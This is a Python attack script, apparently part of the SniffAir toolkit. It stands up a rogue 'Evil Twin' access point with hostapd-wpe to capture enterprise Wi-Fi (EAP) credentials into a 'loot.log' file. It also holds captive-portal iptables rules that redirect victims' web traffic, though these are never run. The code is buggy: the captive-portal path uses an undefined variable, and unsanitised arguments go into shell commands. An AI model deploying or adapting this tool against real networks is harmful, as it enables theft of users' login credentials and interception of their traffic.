#!/usr/bin/python
import argparse
import subprocess
import sys
import os

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', metavar='Interface', dest='interface', action='store', help='The Interface to use\n', required=True)
parser.add_argument('-s', '--ssid', metavar='SSID', dest='ssid', action='store', help='The SSID to attack', required=True)
parser.add_argument('-c', '--channel', metavar='channel', dest='channel', action='store', help='Channel\n', required=True)
parser.add_argument('-w', '--wpa', metavar='wpa', dest='wpa', action='store', help='WPA version type\n', required=True)
parser.add_argument('-a', '--attack', metavar='attack', dest='attack', action='store', help='Attack Type\n', required=True)
parser.add_argument('-E', '--eap_type', metavar='Eap_type', dest='eap_type', action='store', help='Eap type to use\n', required=False)
args = parser.parse_args()
	

def main():
	attack = args.attack
	ssid = args.ssid
	channel = args.channel
	interface = args.interface
	wpa = args.wpa
	encryption = ""

	path = "module/hostapd/hostapd/"		
	

	if attack in ["Capitve Portal"]:
		auth = ("auth_algs=1\n"
				"wmm_enabled=0\n"
				)
		dhcp = ("default-lease-time 300;"
		"max-lease-time 360;"  
		"ddns-update-style none;"  
		"authoritative;"
		"log-facility local7;"  
		"subnet 192.168.0.0 netmask 255.255.255.0 {"  
		"range 192.168.0.100 192.168.0.200;"  
		"option routers 192.168.0.1;"  
		"option domain-name-servers 192.168.17.2;"  
		"}"
	      )

		cmd = ("\"echo \"1\" > /proc/sys/net/ipv4/ip_forward\n" 
			"iptables -t nat -F\n"
			"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n"
        	"iptables -t nat -A PREROUTING -i wlan0 -p tcp -j DNAT --to-destination 192.168.17.128:80\n"
 			)



	if attack in ["Evil Twin"]:
		#if option in ["PSK"]:
			#auth = ("wpa_key_mgmt=WPA-PSK\n"
			#		"wpa_psk=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n"
			#		"wpa_passphrase=12345678\n"
			#		)
		#if option in ["MGT"]:
		auth = ("wpa_key_mgmt=WPA-EAP\n"
					"wpa_pairwise=TKIP CCMP\n"
					)
		#if option in ["WPA1"]:
		WPA = ("wpa="+wpa+"\n"
			"wpa_pairwise=TKIP CCMP\n"
				)
		#if option in ["WPA2"]:
		#	wpa = ("wpa=2\n"
		#		"wpa_pairwise=TKIP CCMP\n"
		#		)

	CHANNEL = ("channel="+channel+"\n")
	SSID = ("ssid="+ssid+"\n")
	IFACE = ("interface="+interface+"\n")


	hostapd =(
			"# Module bitfield: -1 = all\n"
			"logger_syslog=4\n"
			"# Levels: 0 (verbose debug), 1 (debug), 2 (info), 3 (notify), 4 (warning)\n"
			"logger_syslog_level=4\n"
			"# Module bitfield: -1 = all\n"
			"logger_stdout=4\n"
			"# Levels: 0 (verbose debug), 1 (debug), 2 (info), 3 (notify), 4 (warning)\n"
			"logger_stdout_level=4\n"
			"eap_user_file="+path+"hostapd-wpe.eap_user\n"
			"ca_cert="+path+"../../hostapd-wpe/certs/ca.pem\n"
			"server_cert="+path+"../../hostapd-wpe/certs/server.pem\n"
			"private_key="+path+"../../hostapd-wpe/certs/server.pem\n"
			"private_key_passwd=whatever\n"
			"dh_file="+path+"../../hostapd-wpe/certs/dh\n"
			"own_ip_addr=127.0.0.1\n"
			"eap_server=1\n"
			"eap_fast_a_id=101112131415161718191a1b1c1d1e1f\n"
			"eap_fast_a_id_info=hostapd-wpe\n"
			"eap_fast_prov=3\n"
			"ieee8021x=1\n"
			"pac_key_lifetime=604800\n"
			"pac_key_refresh_time=86400\n"
			"pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f\n"
			"hw_mode=b\n"
			"wpe_logfile=loot.log\n"
			)

	subprocess.call('nmcli radio wifi off', shell=True)
	subprocess.call('rfkill unblock wlan', shell=True)
	subprocess.call('ifconfig '+interface+' down', shell=True)
	subprocess.call('iwconfig '+interface+' mode managed', shell=True)
	subprocess.call('ifconfig '+interface+' up', shell=True)
	subprocess.call('ifconfig '+interface+' 10.8.0.1 netmask 255.255.255.0', shell=True)

	file = hostapd + auth + SSID + CHANNEL + IFACE + WPA
	outfile = open('/root/Desktop/sniffair/module/hostapd/hostapd/hostapd-wpe.conf', 'w')
	outfile.write(file)
	outfile.close()
	try:
		os.system(''+path+'hostapd-wpe '+path+'hostapd-wpe.conf')
	except KeyboardInterrupt:
		pass

main()
